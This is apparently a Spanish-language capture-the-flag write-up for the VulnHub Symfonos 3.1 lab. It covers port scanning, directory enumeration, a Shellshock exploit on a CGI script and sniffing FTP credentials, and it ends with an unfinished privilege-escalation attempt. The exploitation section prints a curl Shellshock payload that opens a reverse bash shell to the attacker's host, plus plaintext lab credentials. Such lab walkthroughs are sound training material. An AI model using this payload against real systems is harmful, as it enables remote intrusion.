# SYMFONOS3.1
Desarrollo del CTF SYMFONOS 3.1

## 1. Configuración de la VM

- Descargar la máquina virtual: https://www.vulnhub.com/entry/symfonos-31,332/

Importante: La versión 3.1 tiene BUGS y no he logrado resolverlo por completo.

## 2. Escaneo de Puertos


```
nmap -n -P0 -p- -sC -sV -O -T5 -oA full 10.10.10.153
Nmap scan report for 10.10.10.153
Host is up (0.00047s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.5b
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 cd:64:72:76:80:51:7b:a8:c7:fd:b2:66:fa:b6:98:0c (RSA)
|   256 74:e5:9a:5a:4c:16:90:ca:d8:f7:c7:78:e7:5a:86:81 (ECDSA)
|_  256 3c:e4:0b:b9:db:bf:01:8a:b7:9c:42:bc:cb:1e:41:6b (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 00:0C:29:24:A1:3E (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

<img src="https://github.com/El-Palomo/SYMFONOS3.1/blob/main/symfonos1.jpg" width=80% />

## 3. Enumeración 

### 3.1. Enumeración HTTP

- En el código HTML vemos un mensaje comentado: <!-- Can you bust the underworld? --> 

<img src="https://github.com/El-Palomo/SYMFONOS3.1/blob/main/symfonos2.jpg" width=80% />

- Ejecutamos GOBUSTER y DIRSEARCH

```
root@kali:~/tools/dirsearch# python3 dirsearch.py -u http://10.10.10.154/ -t 16 -r -e txt,html,php,asp,aspx,jsp -f -w /usr/share/seclists/Discovery/Web-Content/big.txt 

  _|. _ _  _  _  _ _|_    v0.4.1
 (_||| _) (/_(_|| (_| )

Extensions: txt, html, php, asp, aspx, jsp | HTTP method: GET | Threads: 16 | Wordlist size: 163783

Error Log: /root/tools/dirsearch/logs/errors-21-04-04_14-12-38.log

Target: http://10.10.10.154/

Output File: /root/tools/dirsearch/reports/10.10.10.154/_21-04-04_14-12-38.txt

[14:12:38] Starting: 
[14:12:38] 403 -  277B  - /.htaccess.html
[14:12:38] 403 -  277B  - /.htaccess.php
[14:12:38] 403 -  277B  - /.htaccess.asp
[14:12:38] 403 -  277B  - /.htaccess.jsp
[14:12:38] 403 -  277B  - /.htaccess.aspx
[14:12:38] 403 -  277B  - /.htpasswd.html
[14:12:38] 403 -  277B  - /.htpasswd.txt
[14:12:38] 403 -  277B  - /.htpasswd.php
[14:12:38] 403 -  277B  - /.htpasswd.asp
[14:12:38] 403 -  277B  - /.htpasswd.aspx
[14:12:38] 403 -  277B  - /.htpasswd.jsp
[14:13:25] 403 -  277B  - /cgi-bin/     (Added to queue)
[14:14:14] 301 -  311B  - /gate  ->  http://10.10.10.154/gate/     (Added to queue)
[14:14:14] 200 -  202B  - /gate/
[14:14:27] 403 -  277B  - /icons/     (Added to queue)
[14:14:31] 200 -  241B  - /index.html
[14:15:55] 403 -  277B  - /server-status
[14:15:55] 403 -  277B  - /server-status/     (Added to queue)
[14:16:45] Starting: cgi-bin/
[14:16:45] 403 -  277B  - /cgi-bin/.htaccess.html
[14:16:45] 403 -  277B  - /cgi-bin/.htaccess.asp
[14:16:45] 403 -  277B  - /cgi-bin/.htaccess.aspx
[14:16:45] 403 -  277B  - /cgi-bin/.htaccess.php
[14:16:45] 403 -  277B  - /cgi-bin/.htaccess.jsp
[14:16:45] 403 -  277B  - /cgi-bin/.htpasswd.txt
[14:16:45] 403 -  277B  - /cgi-bin/.htpasswd.asp
[14:16:45] 403 -  277B  - /cgi-bin/.htpasswd.php
[14:16:45] 403 -  277B  - /cgi-bin/.htpasswd.aspx
[14:16:45] 403 -  277B  - /cgi-bin/.htpasswd.html
[14:16:45] 403 -  277B  - /cgi-bin/.htpasswd.jsp
[14:20:41] Starting: gate/
[14:20:41] 403 -  277B  - /gate/.htaccess.php
[14:20:41] 403 -  277B  - /gate/.htaccess.asp
[14:20:41] 403 -  277B  - /gate/.htaccess.html
[14:20:41] 403 -  277B  - /gate/.htaccess.aspx
[14:20:41] 403 -  277B  - /gate/.htaccess.jsp
[14:20:41] 403 -  277B  - /gate/.htpasswd.txt
[14:20:41] 403 -  277B  - /gate/.htpasswd.html
[14:20:41] 403 -  277B  - /gate/.htpasswd.aspx
[14:20:41] 403 -  277B  - /gate/.htpasswd.asp
[14:20:41] 403 -  277B  - /gate/.htpasswd.php
[14:20:41] 403 -  277B  - /gate/.htpasswd.jsp
```

<img src="https://github.com/El-Palomo/SYMFONOS3.1/blob/main/symfonos3.jpg" width=80% />

- A través de FTP y SSH no podemos enumerar nada. No tenemos otro punto para probar mas accesos. Toca buscar con mas profundidad sobre las dos carpetas identificadas: CGI-BIN y GATE.

> Encontramos un script CGI para ejecutar: /cgi-bin/underworld

<img src="https://github.com/El-Palomo/SYMFONOS3.1/blob/main/symfonos4.jpg" width=80% />

<img src="https://github.com/El-Palomo/SYMFONOS3.1/blob/main/symfonos5.jpg" width=80% />

## 4. Explotación de Vulnerabilidad

- Si tenemos un SCRIPT CGI lo primero que debemos pensar es en SHELLSHOCK.

<img src="https://github.com/El-Palomo/SYMFONOS3.1/blob/main/symfonos6.jpg" width=80% />

- Obtenemos conexión reversa a través de SHELLSHOCK.

```
root@kali:~# curl -i -H "User-agent: () { :;}; /bin/bash -i >& /dev/tcp/10.10.10.133/443 0>&1" http://10.10.10.154/cgi-bin/underworld
```

<img src="https://github.com/El-Palomo/SYMFONOS3.1/blob/main/symfonos7.jpg" width=80% />

- Empezamos a enumerar nuevamente y ejecutamos LINENUM. No encontré nada importante.

```
cerberus@symfonos3:/usr/lib/cgi-bin$ cd /tmp
cd /tmp
cerberus@symfonos3:/tmp$ wget http://10.10.10.133/LinEnum.txt
wget http://10.10.10.133/LinEnum.txt
--2021-04-04 14:21:42--  http://10.10.10.133/LinEnum.txt
Connecting to 10.10.10.133:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 46631 (46K) [text/plain]
Saving to: 'LinEnum.txt'

     0K .......... .......... .......... .......... .....     100%  118M=0s

2021-04-04 14:21:42 (118 MB/s) - 'LinEnum.txt' saved [46631/46631]

cerberus@symfonos3:/tmp$ ls -la
ls -la
total 56
drwxrwxrwt  2 root     root      4096 Apr  4 14:21 .
drwxr-xr-x 22 root     root      4096 Jul 19  2019 ..
-rw-r--r--  1 cerberus cerberus 46631 Apr  2 20:51 LinEnum.txt
cerberus@symfonos3:/tmp$ mv LinEnum.txt LinEnum.sh
mv LinEnum.txt LinEnum.sh
cerberus@symfonos3:/tmp$ chmod +x LinEnum.sh
chmod +x LinEnum.sh
cerberus@symfonos3:/tmp$ ./LinEnum.sh > LinEnum-output.txt
./LinEnum.sh > LinEnum-output.txt
./LinEnum.sh: line 219: echo: write error: Broken pipe
./LinEnum.sh: line 252: echo: write error: Broken pipe
```

<img src="https://github.com/El-Palomo/SYMFONOS3.1/blob/main/symfonos8.jpg" width=80% />

<img src="https://github.com/El-Palomo/SYMFONOS3.1/blob/main/symfonos9.jpg" width=80% />

<img src="https://github.com/El-Palomo/SYMFONOS3.1/blob/main/symfonos10.jpg" width=80% />

- Resaltan dos cosas: la ejecución de ftpclient.py y curl al localhost que guarda la información en la carpeta ftpclient.

> Aquí viene el primer BUG de la VM. No es común poder ejecutar TCPDUMP sin privilegios de ROOT y efectivamente no funciona, sin embargo, si resturamos la VM  y ejecutamos el comando TCPDUMP a veces funciona. Algo no anda bien.

```
cerberus@symfonos3:/tmp$ tcpdump -w ftp-output.pcap -i ens33
tcpdump -w ftp-output.pcap -i ens33
tcpdump: ens33: You don't have permission to capture on that device
(socket: Operation not permitted)
```

<img src="https://github.com/El-Palomo/SYMFONOS3.1/blob/main/symfonos11.jpg" width=80% />

- Lo vuelvo a ejecutar y ahora si funciona (una cosa de locos). Dejemoslo corriendo unos minutos.

```
cerberus@symfonos3:/tmp$ tcpdump -w ftp-output.pcp -i lo
tcpdump -w ftp-output.pcp -i lo
tcpdump: listening on lo, link-type EN10MB (Ethernet), capture size 262144 bytes

```

<img src="https://github.com/El-Palomo/SYMFONOS3.1/blob/main/symfonos12.jpg" width=80% />

<img src="https://github.com/El-Palomo/SYMFONOS3.1/blob/main/symfonos13.jpg" width=80% />

<img src="https://github.com/El-Palomo/SYMFONOS3.1/blob/main/symfonos14.jpg" width=80% />


> Identificamos las siguientes credenciales: hades: PTpZTfU4vxgzvRBE. Ingresamos a través de SSH con las credenciales obtenidas.

<img src="https://github.com/El-Palomo/SYMFONOS3.1/blob/main/symfonos15.jpg" width=80% />


## 5. Escalando Privilegios

- Toca probar todos los caminos posibles para elevar privilegios, habia un archivo que llamaba la atención en el proceso de enumeración en la carpeta OPT.
- El archivo tiene toda la estructura de algo que se ejecuta periodicamente por un CRON, si pudieramos modificarlo esperariamos su ejecución y listo, sin embargo, NO TENEMOS PERMISO.

```
hades@symfonos3:~$ cd /opt
hades@symfonos3:/opt$ ls -la
total 12
drwxr-xr-x  3 root root  4096 Jul 20  2019 .
drwxr-xr-x 22 root root  4096 Jul 19  2019 ..
drwxr-x---  2 root hades 4096 Apr  6  2020 ftpclient
hades@symfonos3:/opt$ cd ftpclient
hades@symfonos3:/opt/ftpclient$ ls -la
total 16
drwxr-x--- 2 root hades 4096 Apr  6  2020 .
drwxr-xr-x 3 root root  4096 Jul 20  2019 ..
-rw-r--r-- 1 root hades  262 Apr  6  2020 ftpclient.py
-rw-r--r-- 1 root hades  251 Apr  4 15:07 statuscheck.txt
hades@symfonos3:/opt/ftpclient$ cat ftpclient.py
import ftplib

ftp = ftplib.FTP('127.0.0.1')
ftp.login(user='hades', passwd='PTpZTfU4vxgzvRBE')

ftp.cwd('/srv/ftp/')

def upload():
    filename = '/opt/client/statuscheck.txt'
    ftp.storbinary('STOR '+filename, open(filename, 'rb'))
    ftp.quit()

upload()
```

<img src="https://github.com/El-Palomo/SYMFONOS3.1/blob/main/symfonos16.jpg" width=80% />

- Hasta este punto llegué en mi proceso de resolución. Aquí revisé como lo resolvieron otras personas y difieren los caminos, algunos muestran que si pueden editar el archivo FTPCLIENT.PY y otros indican que pueden modificar la libreria FTPLIB pero tampoco se puede.


<img src="https://github.com/El-Palomo/SYMFONOS3.1/blob/main/symfonos17.jpg" width=80% />

- Finalmente, pensé en modificar el PATH de PYTHON y espere la ejecución del CRON  pero no funcionó, la modificación del PATH solo funciona por usuario.


```
hades@symfonos3:/usr/lib/python2.7$ export PYTHONPATH='/tmp'
hades@symfonos3:/usr/lib/python2.7$ python -c "import sys; print(sys.path)"
['', '/tmp', '/usr/lib/python2.7', '/usr/lib/python2.7/plat-x86_64-linux-gnu', '/usr/lib/python2.7/lib-tk', '/usr/lib/python2.7/lib-old', '/usr/lib/python2.7/lib-dynload', '/usr/local/lib/python2.7/dist-packages', '/usr/lib/python2.7/dist-packages']
```


